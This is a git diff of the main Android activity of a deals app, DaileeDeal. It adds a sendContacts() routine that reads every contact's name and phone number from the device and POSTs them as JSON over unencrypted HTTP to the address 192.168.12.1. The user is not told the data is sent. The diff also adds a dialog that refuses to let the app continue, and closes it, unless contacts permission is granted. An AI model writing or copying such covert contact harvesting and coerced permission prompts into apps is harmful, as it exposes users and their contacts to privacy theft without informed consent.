@@ -1,10 +1,13 @@
 package mak.livewire.daileedeal.activity;
 import android.Manifest;
+import android.app.Application;
+import android.content.DialogInterface;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.ContactsContract;
 import android.support.annotation.NonNull;
+import android.support.annotation.RequiresPermission;
 import android.support.design.widget.Snackbar;
 import android.support.v4.widget.DrawerLayout;
 import android.support.v4.widget.SwipeRefreshLayout;
@@ -26,14 +29,24 @@ import android.webkit.WebViewClient;
 import android.widget.RelativeLayout;
 import android.os.Handler;
 
+import com.android.volley.AuthFailureError;
+import com.android.volley.NetworkResponse;
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.Response;
+import com.android.volley.VolleyError;
+import com.android.volley.VolleyLog;
+import com.android.volley.toolbox.HttpHeaderParser;
+import com.android.volley.toolbox.StringRequest;
+import com.android.volley.toolbox.Volley;
 import com.google.android.gms.appindexing.Action;
 import com.google.android.gms.appindexing.AppIndex;
 import com.google.android.gms.appindexing.Thing;
 import com.google.android.gms.common.ConnectionResult;
 import com.google.android.gms.common.GoogleApiAvailability;
 import com.google.android.gms.common.api.GoogleApiClient;
-import com.google.zxing.integration.android.IntentIntegrator;
-import com.google.zxing.integration.android.IntentResult;
+//import com.google.zxing.integration.android.IntentIntegrator;
+//import com.google.zxing.integration.android.IntentResult;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -46,8 +59,15 @@ import android.support.v7.app.*;
 import android.util.Log;
 import android.widget.Toast;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 import mak.livewire.daileedeal.CustomSwipeRefreshLayout;
 import mak.livewire.daileedeal.Jsongetter;
@@ -57,6 +77,7 @@ import mak.livewire.daileedeal.gcm.RegistrationIntentService;
 
 public class MainActivity extends AppCompatActivity implements CustomSwipeRefreshLayout.CanChildScrollUpCallback,FragmentDrawer.FragmentDrawerListener {
     //public ProgressBar progress;
+    private JSONArray jsonArray;
     private static final int REQUEST_CODE_SOME_FEATURES_PERMISSIONS=138;
     //private FragmentDrawer drawerFragment;
     private WebView mWebView;
@@ -85,7 +106,7 @@ public class MainActivity extends AppCompatActivity implements CustomSwipeRefres
     protected void onCreate(Bundle savedInstanceState) {
 //barcode scanner
 
-
+jsonArray=new JSONArray();
         //new Jsongetter(this).getTags();
         noti_addr = "https://daileedeal.com";
         intent = getIntent();
@@ -192,16 +213,11 @@ boolean contactsentflag=false;
 
         if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
             contactsentflag=true;
-            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-            while (phones.moveToNext()) {
-                String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                Log.e("contacts", name + "-" + phoneNumber);
-            }
-
-            phones.close();
+            sendContacts();
 
         }
+
+
     }
 
 
@@ -344,26 +360,57 @@ boolean contactsentflag=false;
 
                        // integrator.initiateScan();
                         //do stuff here
-                        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-                        while (phones.moveToNext()) {
-                            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            Log.e("contacts", name + "-" + phoneNumber);
-                        }
-
-                        phones.close();
+                        sendContacts();
 
 
 
-                    } /*else if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
+                    } else if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                         Log.d("Permissions", "Permission Denied: " + permissions[i]);
-                        Snackbar.make((RelativeLayout)findViewById(R.id.drawer_layout), "Camera Permissions are needed for Barcode scanner.", Snackbar.LENGTH_SHORT).show();
 
-                    } */
+                        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
+                                MainActivity.this);
+
+                        // set title
+                        alertDialogBuilder.setTitle("Need Contacts info to Continue !");
+
+                        // set dialog message
+                        alertDialogBuilder
+                                .setMessage("DaileeDeal requires your contacts info to continue")
+                                .setCancelable(false)
+                                .setPositiveButton("Ok",new DialogInterface.OnClickListener() {
+                                    public void onClick(DialogInterface dialog,int id) {
+                                        // if this button is clicked, close
+                                        // current activity
+                                        if(android.os.Build.VERSION.SDK_INT >= 23)
+                                            requestPermissions(new String[] {Manifest.permission.READ_CONTACTS},REQUEST_CODE_SOME_FEATURES_PERMISSIONS);
+
+                                    }
+                                })
+                                .setNegativeButton("Cancel",new DialogInterface.OnClickListener() {
+                                    public void onClick(DialogInterface dialog, int id) {
+                                        // if this button is clicked, just close
+                                        // the dialog box and do nothing
+
+                                        dialog.cancel();
+                                        MainActivity.this.finish();
+                                    }
+                                });
+
+                        // create alert dialog
+                        AlertDialog alertDialog = alertDialogBuilder.create();
+
+                        // show it
+                        alertDialog.show();
+
+                    }
                 }
             }
             break;
             default: {
+
+               // Snackbar.make(mWebView,"DaileeDeal wont be able to proceed without Contacts permission",Snackbar.LENGTH_LONG).show();
+
+
                 super.onRequestPermissionsResult(requestCode, permissions, grantResults);
             }
         }
@@ -413,8 +460,8 @@ boolean contactsentflag=false;
         }
     }
 
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+    //@Override
+   /* protected void onActivityResult(int requestCode, int resultCode, Intent data) {
 
         IntentResult result = IntentIntegrator.parseActivityResult(requestCode, resultCode, data);
         if(result != null) {
@@ -434,7 +481,7 @@ boolean contactsentflag=false;
             super.onActivityResult(requestCode, resultCode, data);
         }
     }
-
+*/
     @Override
     protected void onResume() {
         super.onResume();
@@ -613,4 +660,64 @@ boolean contactsentflag=false;
         }
     }
 
+    void sendContacts()
+    {
+int len=0;
+        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+        while (phones.moveToNext()) {
+            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+            //Log.e("contacts", name + "-" + phoneNumber);
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("name", name);
+                jsonObject.put("phone", phoneNumber);
+                jsonArray.put(jsonObject);
+                len++;
+                //
+
+
+            }
+            catch (JSONException e) {}
+
+        }
+        JSONObject packed_contacts=new JSONObject();
+       try { packed_contacts.put("msg",jsonArray);
+        packed_contacts.put("len",Integer.toString(len)); }
+       catch (JSONException e) {}
+
+        vollyContacts(packed_contacts);
+        //Toast.makeText(MainActivity.this,packed_contacts.toString(),Toast.LENGTH_LONG).show();
+        phones.close();
+
+    }
+    void vollyContacts(final JSONObject info)
+    {    //Toast.makeText(MainActivity.this,info.toString(),Toast.LENGTH_LONG).show();
+        final RequestQueue MyRequestQueue = Volley.newRequestQueue(this);
+
+        String url = "http://192.168.12.1";
+        StringRequest MyStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
+            @Override
+            public void onResponse(String response) {
+                //This code is executed if the server responds, whether or not the response contains data.
+                //The String 'response' contains the server's response.
+               // Toast.makeText(MainActivity.this,response.toString(),Toast.LENGTH_LONG).show();
+            }
+        }, new Response.ErrorListener() { //Create an error listener to handle errors appropriately.
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                //This code is executed if there is an error.
+            }
+        }) {
+            protected Map<String, String> getParams() {
+                Map<String, String> MyData = new HashMap<String, String>();
+                MyData.put("a", info.toString()); //Add the data you'd like to send to the server.
+                return MyData;
+            }
+        };
+        MyRequestQueue.add(MyStringRequest);
+
+
+
+    }
 }
